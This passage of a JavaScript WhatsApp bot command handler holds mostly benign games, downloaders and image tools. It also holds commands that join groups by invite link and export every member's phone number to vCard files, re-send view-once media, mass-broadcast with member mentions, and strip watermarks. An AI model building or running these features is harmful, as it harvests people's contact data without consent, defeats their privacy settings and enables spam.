                2: '2️⃣',
                3: '3️⃣',
                4: '4️⃣',
                5: '5️⃣',
                6: '6️⃣',
                7: '7️⃣',
                8: '8️⃣',
                9: '9️⃣',
            }[v];
        });
        let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`;
        if (room.x !== room.o) await PhistarBotInc.sendText(room.x, str, m, {
            mentions: parseMention(str)
        });
        await PhistarBotInc.sendText(room.o, str, m, {
            mentions: parseMention(str)
        });
    } else {
        room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
        };
        if (text) room.name = text;
        replyphistar('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''));
        this.game[room.id] = room;
    }
}
break;

case 'delttc':
case 'delttt': {
    this.game = this.game ? this.game : {};
    try {
        if (this.game) {
            delete this.game;
            PhistarBotInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
        } else if (!this.game) {
            replyphistar(`Session TicTacToe🎮 tidak ada`);
        } else replyphistar('?');
    } catch (e) {
        replyphistar('rusak');
    }
}
break;

case 'catholic': {
    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        const apiResponse = await axios.get('http://calapi.inadiutorium.cz/api/v0/en/calendars/default/today');
        const data = apiResponse.data;

        let responseText = `📅 *Liturgical Celebration Today*\n\n`;
        responseText += `📆 *Date:* ${data.date}\n`;
        responseText += `📅 *Weekday:* ${data.weekday.charAt(0).toUpperCase() + data.weekday.slice(1)}\n`;
        responseText += `📖 *Season:* ${data.season.charAt(0).toUpperCase() + data.season.slice(1)} (Week ${data.season_week})\n\n`;

        for (let celebration of data.celebrations) {
            responseText += `🎉 *Title:* ${celebration.title}\n`;
            responseText += `🎨 *Colour:* ${celebration.colour.charAt(0).toUpperCase() + celebration.colour.slice(1)}\n`;
            responseText += `🏅 *Rank:* ${celebration.rank} (Rank No: ${celebration.rank_num})\n\n`;
        }
        
        const litpic = 'https://files.catbox.moe/q2fzqb.jpg';
        await PhistarBotInc.sendMessage(m.chat, { image: { url: litpic }, caption: responseText }, { quoted: m });
  
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (error) {
        console.error('Error fetching liturgical data:', error);
        replyphistar(`❌ Failed to fetch liturgical details. Please try again later.`);
    }
}
break;
case 'amazon': {
    if (!text) return replyphistar('Enter the product you want to search for');
    let p = await (await fetch('https://endpoint.web.id/search/amazon?key=gojou&query=' + text)).json();
    let u = p.result;
    let firstImageUrl = u[0].imageUrl;
    let caption = u.map(item => 
        `Rating: ${item.rating}\n` +
        `Title: ${item.title}\n` +
        `Price: $${item.price}\n` +
        `Product URL: ${item.productUrl}`
    ).join('\n\n');
    PhistarBotInc.sendMessage(m.chat, { image: { url: firstImageUrl }, caption: caption }, { quoted: m });
}
break;
case 'opengroup': 
case 'buka': {
    if (!m.isGroup) return replyphistar(`For Group Only`);
    if (!isAdmins) return replyphistar(`For Admins Only`);
    PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement');
    replyphistar(`Done`);
}
break;

case 'close': 
case 'closegroup': {
    if (!m.isGroup) return replyphistar(`For Group Only`);
    if (!isAdmins) return replyphistar(`For Admins Only`);
    PhistarBotInc.groupSettingUpdate(m.chat, 'announcement');
    replyphistar(`Done`);
}
break;
case 'createvcf2': {
    if (!text) return replyphistar("❌ Provide a group link or group JID.\n\nExample:\n.createvcffor https://chat.whatsapp.com/xyzAbcDef\n.createvcffor 1203630xxxxx@g.us");

    let gcJid;

    // From link
    if (text.includes("chat.whatsapp.com")) {
        let code = text.trim().split("https://chat.whatsapp.com/")[1];
        if (!code) return replyphistar("❌ Invalid group link.");
        try {
            gcJid = await PhistarBotInc.groupAcceptInvite(code);
        } catch (err) {
            return replyphistar("❌ Couldn't join group. Maybe already in or banned.");
        }
    } else if (text.endsWith("@g.us")) {
        gcJid = text.trim();
    } else {
        return replyphistar("❌ Invalid input. Use a group link or JID.");
    }

    try {
        const metadata = await PhistarBotInc.groupMetadata(gcJid);
        const members = metadata.participants;
        const groupName = metadata.subject.replace(/\W+/g, "_");
        const totalBatches = Math.ceil(members.length / 100);

        replyphistar(`📤 Creating VCF files...\n👥 Group: *${metadata.subject}*\n📦 Total Members: ${members.length}\n🗂️ Files to send: ${totalBatches}`);

        for (let b = 0; b < totalBatches; b++) {
            let vcfText = '';
            let batch = members.slice(b * 100, (b + 1) * 100);

            for (let i = 0; i < batch.length; i++) {
                const jid = batch[i].id;
                const num = jid.split('@')[0];
                const name = `+${num}`; // Use number as contact name

                try {
                    await PhistarBotInc.sendPresenceUpdate('composing', jid);
                    await sleep(50);
                } catch {}

                vcfText += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${num}:${name}\nEND:VCARD\n\n`;
            }

            const fileName = `./tmp/${groupName}_VCF_Part${b + 1}.vcf`;
            fs.writeFileSync(fileName, vcfText);

            await PhistarBotInc.sendMessage(m.chat, {
                document: fs.readFileSync(fileName),
                fileName: `${groupName}_Part${b + 1}.vcf`,
                mimetype: 'text/x-vcard',
                caption: `📇 *${metadata.subject}*\n🧾 *Contacts:* ${batch.length}\n📂 *File ${b + 1} of ${totalBatches}*`
            }, { quoted: m });

            await sleep(500); // Optional pause
        }

    } catch (e) {
        console.log(e);
        replyphistar("❌ Error creating VCFs. Make sure the group exists and the bot has access.");
    }
    break;
}
case 'mediafire': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://www.mediafire.com/file/n6tgcrktbnov1oy/Big_Daddy_2.zip/file`);

    try {
        
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `📥`, key: m.key } });

        const apiUrl = `https://apis.davidcyriltech.my.id/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;

            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: downloadLink },
                mimetype: mimeType,
                fileName: fileName,
                caption: `📦 *File Name:* ${fileName}\n\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {
        console.error('Error during MediaFire command:', error);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'ss': case 'ssweb': {
    if (!args[0]) return replyphistar(`Please provide a link\n\n Example: ${prefix + command}.`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `📸`, key: m.key } });

    let apiUrl = `https://apis.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(args[0])}`;

    try {
        await PhistarBotInc.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🖼️ Screenshot of ${args[0]}` }, { quoted: m });
    } catch (error) {
        console.error(error);
        replyphistar('Failed to capture the screenshot. Please try again later.');
    }
    break;
}

case 'wanted': {
    // Ensure the command is a reply to an image
    if (!/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .wanted to create a wanted poster*`);
    }

    // Check if there is a quoted message (the image)
    if (!quoted) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .wanted to create a wanted poster*`);
    }

    try {
        // React to show that processing has started
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Download the image locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image to Imgur
        const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL

        // Call the "wanted" API with the uploaded image URL
        const apiResponse = await axios.get(`https://api.popcat.xyz/wanted`, {
            params: { image: imageUrl }
        });

        // Check the API response
        if (apiResponse.status === 200) {
            const wantedImageUrl = apiResponse.request.res.responseUrl; // The URL of the wanted poster

            // Send the wanted poster back to the user
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: wantedImageUrl },
                caption: `*Generated*`
            }, { quoted: m });
        } else {
            replyphistar(`*WANTED POSTER ERROR!! MESSAGE :*\n\n> Failed to create a wanted poster. Try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in Wanted command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    // React to indicate success
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });
    break;
}
case 'mods': case 'modapk': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function mods(apk) {
        const url = `https://m.happymod.com/search.html?q=${apk}`;

        const response = await axios.get(url);
        const html = response.data;
        const $ = cheerio.load(html);

        const apps = [];

        $('.app-info-list .s-app-block').each((index, element) => {
            const app = {
                creator: '`Phistar`',
                status: 200,
                title: $(element).find('.info-wrap .nowrap a').text().trim(),
                image: $(element).find('.img img').attr('data-src'),
                downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
            };
            apps.push(app);
            if (apps.length >= 5) return false;
        });

        return apps;
    }

    if (text) {
        const response = await mods(text);
        let result = '';

        response.forEach((app, index) => {
            result += `*${index + 1}*. ${app.title}:\n`;
            result += `∘ Download ${app.downloadUrl}\n\n`;
        });

        PhistarBotInc.sendMessage(m.chat, {
            text: result,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: false,
                    title: `M O D S  S E A R C H`,
                    body: `Looking for Cool and Free Apk Mods!`,
                    sourceUrl: 'https://m.happymod.com',
                    thumbnailUrl: 'https://imgur.com/a/PD8nT5X',
                    mediaType: 2,
                    renderLargerThumbnail: true
                }
            }
        });
    } else {
        replyphistar(`Enter Text, *Like This Format*: .${command} minecraft`);
    }
}
break;

case "twitter":
case "x": {
    if (!text) return replyphistar("❌ Please provide a Twitter/X URL.\n\nExample: .twitter https://x.com/elonmusk/status/1870901510319833540");

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "📥", key: m.key } });

    try {
        let response = await axios.get(`https://apis.davidcyriltech.my.id/twitter?url=${encodeURIComponent(text)}`);

        if (response.data && response.data.success) {
            let caption = `📌 *Twitter Video Downloaded!*\n\n🔗 *Source:* [Click Here](${response.data.description})`;

            let mediaOptions = [];
            if (response.data.video_hd) {
                mediaOptions.push({
                    video: { url: response.data.video_hd },
                    mimetype: "video/mp4",
                    caption: `${caption}\n🎥 *Quality:* HD`,
                });
            }
            if (response.data.video_sd) {
                mediaOptions.push({
                    video: { url: response.data.video_sd },
                    mimetype: "video/mp4",
                    caption: `${caption}\n🎥 *Quality:* SD`,
                });
            }

            if (response.data.thumbnail) {
                let thumbnailBuffer = await axios.get(response.data.thumbnail, { responseType: "arraybuffer" });
                mediaOptions.forEach((obj) => (obj.jpegThumbnail = thumbnailBuffer.data));
            }

            for (let media of mediaOptions) {
                await PhistarBotInc.sendMessage(m.chat, media, { quoted: m });
                await sleep(3000); // Prevent rate limits
            }
        } else {
            replyphistar("❌ Failed to download the Twitter video.");
        }
    } catch (error) {
        console.error("❌ Twitter Download Error:", error);
        replyphistar("❌ An error occurred while fetching the video.");
    }

    break;
}

case 'checkip':
  
    const apiUrlIpify = 'https://api.ipify.org?format=json';

    try {
        // Step 1: Get public IP from ipify
        const ipifyResponse = await axios.get(apiUrlIpify);
        const ipAddress = ipifyResponse.data.ip;

        // Step 2: Use the IP address to get geolocation data from ip-api
        const apiUrlIpApi = `http://ip-api.com/json/${ipAddress}`;
        const ipApiResponse = await axios.get(apiUrlIpApi);
        const locationData = ipApiResponse.data;

        if (locationData.status === "fail") {
            return replyphistar(`Error: ${locationData.message}`);
        }

        const message = `
        Public IP: ${ipAddress}\n
        Country: ${locationData.country}\n
        Region: ${locationData.regionName}\n
        City: ${locationData.city}\n
        Latitude: ${locationData.lat}\n
        Longitude: ${locationData.lon}\n
        ISP: ${locationData.isp}\n
        Timezone: ${locationData.timezone}\n
      `;

        PhistarBotInc.sendMessage(from, { text: message }, { quoted: m });
    } catch (error) {
        console.error('Error fetching IP data:', error);
        replyphistar('Failed to fetch IP location data. Please try again later.');
    }
    break;

case 'open': case 'steal': {
    if (!m.quoted) return replyphistar(`Reply view once message to use this command`);
    let typeS = Object.keys(m.quoted.message)[0];
    let quotedType = m.quoted.message[typeS];
    var mediaaaaaaaaaa = await downloadContentFromMessage(quotedType, typeS == "imageMessage" ? "image" : "video");
    let buffer = Buffer.from([]);
    for await (let chunk of mediaaaaaaaaaa) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    if (/video/.test(typeS)) {
        await PhistarBotInc.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, { quoted: m });
    } 
    else if (/image/.test(typeS)) {
        await PhistarBotInc.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, { quoted: m });
    }
}
break;
case 'meme': {
    const memeUrl = "https://meme-api.com/gimme";

    try {
        const memeRes = await axios.get(memeUrl);
        const memeImg = memeRes.data.url;
        const memeTitle = memeRes.data.title;
        await PhistarBotInc.sendMessage(m.chat, { image: { url: memeImg }, caption: memeTitle }, { quoted: m });
    } catch (error) {
        replyphistar("Failed to fetch a meme.");
    }
    break;
}

case 'clearchat': {
    PhistarBotInc.chatModify({
        delete: true, 
        lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
    }, m.chat);
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } }, { quoted: m });
    break;
}
case 'countdown': {
    let timess = parseInt(args[0]);
    if (isNaN(timess)) return replyphistar("Please provide a valid time in seconds.");
    
    const countdownInterval = setInterval(() => {
        timess--;
        replyphistar(`Time left: ${timess} seconds`);
        if (timess === 0) {
            clearInterval(countdownInterval);
            replyphistar("Countdown finished!");
        }
    }, 1000);
    break;
}
case 'ghstalk': case 'githubstalk': {
    replyphistar('`Wait...`');
    if (!q) return replyphistar(`Example ${prefix+command} phistar`);
    replyphistar('`Processing...`'); 
    aj = await githubstalk.githubstalk(`${q}`);
    PhistarBotInc.sendMessage(m.chat, { 
        image: { url: aj.profile_pic }, 
        caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.created_at}
Updated At : ${aj.updated_at}` 
    }, { quoted: m });
}
break;
case 'tweet': {
    if (!text || !text.includes('|')) {
        return replyphistar(`*Usage:* .tweet <name>|<username>|<tweet>\n\n*Example:* .tweet John Doe|jhon|Hello World`);
    }

    try {
        // Parse input into name, username, and tweet text
        const [name, username, tweetText] = text.split('|').map(t => t.trim());

        if (!name || !username || !tweetText) {
            return replyphistar(`*Usage:* .tweet <name>|<username>|<tweet>\n\n*Example:* .tweet John Doe|jhon|Hello World`);
        }

        // Generate the API URL with query parameters
        const tweetImageUrl = `https://api.siputzx.my.id/api/m/tweet?name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&tweet=${encodeURIComponent(tweetText)}`;

        // Send the generated tweet image
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: tweetImageUrl },
            caption: `\n> Generated`,
        }, { quoted: m });
    } catch (error) {
        console.error('Error in Tweet command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'vcf': 
case 'savecontact': 
case 'svcontact': {
    if (!m.isGroup) return replyphistar(`For Groups Only`);
  
    try {
        let cmiggc = await PhistarBotInc.groupMetadata(m.chat);  // Get group metadata
        let participants = cmiggc.participants;        // Get group participants
        let vcard = '';

        // Iterate through participants and generate vCard entries
        for (let a of participants) {
            // Fetch the WhatsApp name (pushname), fallback to the number if not available
            let contactName = (await PhistarBotInc.getName(a.id)) || a.id.split("@")[0];
            let number = a.id.split("@")[0];
            
            // Format the vCard entry with the contact's name and number
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${contactName}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;

            // Delay to avoid overloading the server
            await sleep(300);
        }

        // Save all contacts to a single file
        let filename = `./contacts.vcf`;
        require('fs').writeFileSync(filename, vcard.trim());

        // Send the vCard file to the chat
        await PhistarBotInc.sendMessage(m.chat, {
            document: require('fs').readFileSync(filename),
            mimetype: 'text/vcard',
            fileName: `Group_Contacts.vcf`,
            caption: `Group: *${cmiggc.subject}*\nContacts: *${participants.length}*`
        }, { ephemeralExpiration: 86400, quoted: m });

        // Delete the file after sending
        require('fs').unlinkSync(filename);
    } catch (error) {
        console.error("Error generating contacts:", error);
        replyphistar("An error occurred while generating the contact file.");
    }
    break;
}

case 'horoscope': {
    if (!text) return replyphistar('Please provide a zodiac sign. Example: .horoscope aries');

    const [zodiacSign, period = 'daily'] = text.toLowerCase().split(' ');

    // Ensure the zodiac sign is valid
    const validSigns = ['aries', 'taurus', 'gemini', 'cancer', 'leo', 'virgo', 'libra', 'scorpio', 'sagittarius', 'capricorn', 'aquarius', 'pisces'];
    if (!validSigns.includes(zodiacSign)) {
        return replyphistar('Invalid zodiac sign. Please choose a valid zodiac sign. Example: .horoscope aries');
    }

    // Ensure the period is valid
    const validPeriods = ['daily', 'weekly', 'monthly', 'yearly'];
    if (!validPeriods.includes(period)) {
        return replyphistar('Invalid period. Please choose one: daily, weekly, monthly, or yearly.');
    }

    try {
        // Fetch the horoscope data
        const response = await axios.get(`https://horoscope-app-api.vercel.app/api/v1/get-horoscope/${period}?sign=${zodiacSign}&day=TODAY`);
        const horoscope = response.data;

        if (horoscope.status === 200) {
            // Send the horoscope message
            await PhistarBotInc.sendMessage(m.chat, {
                text: `*Horoscope for ${zodiacSign.charAt(0).toUpperCase() + zodiacSign.slice(1)} (${period.charAt(0).toUpperCase() + period.slice(1)})*\n\n${horoscope.data.horoscope_data}`
            }, { quoted: m });
        } else {
            replyphistar('Could not fetch the horoscope data. Please try again later.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('Failed to fetch the horoscope. Please try again later.');
    }
    break;
}

async function catboxUploader(path) {
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('userhash', ''); // Optional, can be left blank
    form.append('fileToUpload', fs.createReadStream(path)); // Attach the file

    const headers = form.getHeaders();

    try {
        const response = await axios.post('https://catbox.moe/user/api.php', form, { headers });
        return response.data.trim(); // Return the uploaded file URL
    } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw new Error('Failed to upload to Catbox');
    }
}

case 'hdvid':
case 'hdvideo':
case 'vidiohd':
case 'tohd':
case 'vidhd': {
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
    if (!mime) return replyphistar(`Where is the video?`);

    // React to the message
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🔄`, key: m.key } });

    // Download the media file
    const media = await PhistarBotInc.downloadAndSaveMediaMessage(q);

    const output = 'output.mp4'; // Output file name

    // Enhance the video resolution using ffmpeg
    exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, async (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            replyphistar('Failed to enhance video resolution.');
            fs.unlinkSync(media); // Clean up
            return;
        }

        console.log(`stdout: ${stdout}`);
        console.error(`stderr: ${stderr}`);

        // Upload the enhanced video to Catbox
        try {
            const catboxUrl = await uploadFile(output);

            // Send the Catbox URL back to the chat
            await PhistarBotInc.sendMessage(
                m.chat,
                { 
                    caption: `Succesfully Enhanced Your Video\n\n> Generated`, 
                    video: { url: output } 
                }, 
                { quoted: m }
            );
        } catch (uploadError) {
            console.error(uploadError.message);
            replyphistar('Failed to upload the video to Catbox.');
        }

        // Clean up temporary files
        fs.unlinkSync(output);
        fs.unlinkSync(media);
    });
}
break;
case 'couple': {
    if (!quoted) return replyphistar(`Example : ${prefix + command} Phistar|Big Daddy`);
    let [nama1, nama2] = q.split`|`;
    let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2);
    if (anu.status == false) return replyphistar(anu.message);
    let teks = `
• *Your name :* ${anu.message.nama_anda}
• *Couple Name :* ${anu.message.nama_pasangan}
• *Positive Side :* ${anu.message.sisi_positif}
• *Negative Side :* ${anu.message.sisi_negatif}`;
    replyphistar(teks);
}
break;
case 'bcgc': case 'bcgroup': {
    if (!isCreator) return replyphistar('Owner only');

    if (!text) return replyphistar(`Text?\n\nExample : ${prefix + command} Update Big Daddy 2 !`);
    let getGroups = await PhistarBotInc.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let anu = groups.map(v => v.id);
    replyphistar(`Send Broadcast To ${anu.length} Group Chat.`);
    for (let i of anu) {
        await sleep(1500);
        PhistarBotInc.sendMessage(i, {text: `${text}`}, {quoted:m});
    }
    replyphistar(`Successfully Sending Broadcast To ${anu.length} Group`);
}
break;

case 'jpm': {
    if (!isCreator) return replyphistar("?");
    if (!text) return replyphistar(`*Input Format*\n${prefix+command} text|pause\nReply photo to jpm Give a pause, 1000 = 1 second\n\nExample: ${prefix + command} single siamang keris|4000`);
    let getGroups = await PhistarBotInc.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);
    for (let xnxx of anu) {
        let metadat72 = await PhistarBotInc.groupMetadata(xnxx);
        let participanh = await metadat72.participants;
        if (/image/.test(mime)) {
            media = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
            mem = await TelegraPH(media);
            await PhistarBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) });
            await sleep(text.split('|')[1]);
        } else {
            await PhistarBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) });
            await sleep(text.split('|')[1]);
        }
    }
    replyphistar(`Success`);
}
break;
case 'hdimg2': case 'remini2': {
    if (!/image/.test(mime)) return replyphistar(`❌ Reply to an *image* with .remini to enhance it.`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

    try {
        const media = await m.quoted.download();
        const fileType = m.quoted.mimetype.split('/')[1]; 
        

        let result = await uploadFile(media, fileType);
        
        if (!result.success) return replyphistar(`❌ Upload failed: ${result.error}`);

        const imageUrl = result.url;
        const enhancedImageUrl = `https://bk9.fun/tools/enhance?url=${imageUrl}`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: enhancedImageUrl },
            caption: `✨ *Image Enhanced Successfully!*`
        }, { quoted: m });

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (error) {
        console.error('Error in Remini command:', error);
        replyphistar(`❌ Error: ${error.message}`);
    }
    break;
}

case 'removebackground': case 'removebg': {
    if (!/image/.test(mime)) return replyphistar(`❌ Reply to an *image* with .removebg to remove background.`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

    try {
        const media = await m.quoted.download();
        const fileType = m.quoted.mimetype.split('/')[1]; 
        

        let result = await uploadFile(media, fileType);
        
        if (!result.success) return replyphistar(`❌ Upload failed: ${result.error}`);

        const imageUrl = result.url; 
        const removedBgUrl = `https://apis.davidcyriltech.my.id/removebg?url=${imageUrl}`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: removedBgUrl },
            caption: `🖼️ *Background Removed Successfully!*`
        }, { quoted: m });

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (error) {
        console.error('Error in RemoveBG command:', error);
        replyphistar(`❌ Error: ${error.message}`);
    }
    break;
}

case 'removewatermark': case 'delwatermark': {
    if (!/image/.test(mime)) return replyphistar(`❌ Reply to an *image* with .delwatermark`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

    try {
        const media = await m.quoted.download();
        const fileType = m.quoted.mimetype.split('/')[1]; 
        

        let result = await uploadFile(media, fileType);
        
        if (!result.success) return replyphistar(`❌ Upload failed: ${result.error}`);

        const imageUrl = result.url; 
        const removedBgUrl = `https://api.siputzx.my.id/api/tools/dewatermark?url=${imageUrl}`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: removedBgUrl },
            caption: `🖼️ *Watermark Removed Successfully!*`
        }, { quoted: m });

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (error) {
        console.error('Error in RemoveBG command:', error);
        replyphistar(`❌ Error: ${error.message}`);
    }
    break;
}

case 'drake': {
    if (!text || !text.includes('|')) {
        return replyphistar(`*Usage:* .drakememe <text1>|<text2>\n\n*Example:* .drakememe amongus|amogus`);
    }

    try {
        // Split the input into two parts
        const [text1, text2] = text.split('|').map(t => t.trim());

        if (!text1 || !text2) {
            return replyphistar(`*Usage:* .drakememe <text1>|<text2>\n\n*Example:* .drakememe amongus|amogus`);
        }

        // Call the Popcat API to generate the meme
        const apiResponse = await axios.get(`https://api.popcat.xyz/drake`, {
            params: { text1, text2 }
        });

        if (apiResponse.status === 200) {
            const memeUrl = apiResponse.request.res.responseUrl; // The URL of the generated meme

            // Send the generated meme back to the user
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: memeUrl },
                caption: `*Generated*`
            }, { quoted: m });
        } else {
            replyphistar(`*MEME GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate a Drake meme. Try again.`);
        }
    } catch (error) {
        console.error('Error in Drake Meme command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    break;
}

case 'ship': {
    try {
        // Ensure the command is used in a group
        if (!isGroup) return replyphistar('This command can only be used in groups.');

        // Get the list of group members
        const groupMembers = groupMetadata.participants.map(member => member.id);
        if (groupMembers.length < 2) return replyphistar('Not enough members to use the ship command.');

        // Select two random members
        const [user1, user2] = groupMembers.sort(() => Math.random() - 0.5).slice(0, 2);

        // Fetch profile pictures for the two users
        const profilePic1 = await PhistarBotInc.profilePictureUrl(user1, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        const profilePic2 = await PhistarBotInc.profilePictureUrl(user2, 'image').catch(() => 'https://cdn.popcat.xyz/popcat.png');

        // Call the Popcat API to generate the ship image
        const apiResponse = await axios.get(`https://api.popcat.xyz/ship`, {
            params: { user1: profilePic1, user2: profilePic2 }
        });

        if (apiResponse.status === 200) {
            const shipImageUrl = apiResponse.request.res.responseUrl; // The URL of the generated ship image

            // Send the ship image with a caption tagging the two members
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: shipImageUrl },
                caption: `❤️ @${user1.split('@')[0]} *LOVES* @${user2.split('@')[0]} ❤️\n*[ 😍 Latest Couples 🥺 ]*`,
                mentions: [user1, user2], // Proper tagging for both users
            }, { quoted: m });
        } else {
            replyphistar(`*SHIP GENERATION ERROR!! MESSAGE :*\n\n> Failed to ship. Try again.`);
        }
    } catch (error) {
        console.error('Error in Ship command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case "reactch": {
    if (!text || !args[0] || !args[1]) 
        return replyphistar("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 😂");
    if (!args[0].includes("https://whatsapp.com/channel/")) 
        return replyphistar("Link tautan tidak valid");
    let result = args[0].split('/')[4];
    let serverId = args[0].split('/')[5];
    let res = await PhistarBotInc.newsletterMetadata("invite", result);
    await PhistarBotInc.newsletterReactMessage(res.id, serverId, args[1]);
    replyphistar(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`);
}
break;

case "reactchs": {
    if (!text || !args[0] || !args[1]) 
        return replyphistar("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 😂");
    if (!args[0].includes("https://whatsapp.com/channel/")) 
        return replyphistar("Link tautan tidak valid");
    let result = args[0].split('/')[4];
    let serverId = args[0].split('/')[5];
    let res = await PhistarBotInc.newsletterMetadata("invite", result);
    await PhistarBotInc.newsletterReactMessage(res.id, serverId, args[1]);
    replyphistar(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`);
}
break;

case "reactchannel": {
    if (!isCreator) return replyphistar('For My Owner Only');

    if (!text) return replyphistar("Usage example:\n.reactchannel https://whatsapp.com/channel/xxx/123 ❤️\n.reactchs https://whatsapp.com/channel/xxx/123 David 5");

    const letterStyle = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const args = text.trim().split(/\s+/); // split by spaces
    const link = args[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
